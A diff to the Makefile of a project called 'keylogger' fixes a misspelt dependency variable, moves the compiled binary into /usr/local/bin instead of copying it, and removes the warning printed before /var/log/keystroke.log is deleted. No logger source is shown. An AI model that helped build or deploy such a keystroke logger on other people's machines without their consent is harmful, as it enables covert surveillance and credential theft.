@@ -4,15 +4,14 @@ LDFLAGS=-Wl,-z,relro,-z,now
 SOURCES=keylogger.c
 EXECUTABLE=keylogger
 INSTALLDIR=/usr/local/bin
-DEPENDEPCIES=define.h functions.h
+DEPENDENCIES=define.h functions.h
 
-install:$(SOURCES) $(DEPENDEPCIES)
+install:$(SOURCES) $(DEPENDENCIES)
 	@$(CC) $(SOURCES) $(CFLAGS) $(LDFLAGS) -o $(EXECUTABLE)
-	@cp $(EXECUTABLE) $(INSTALLDIR)
+	@mv $(EXECUTABLE) $(INSTALLDIR)
 
 uninstall:
 	@rm $(INSTALLDIR)/$(EXECUTABLE)
-
+	
 remove:
-	@echo "This will remove the /var/log/keystroke.log file"
 	@rm /var/log/keystroke.log
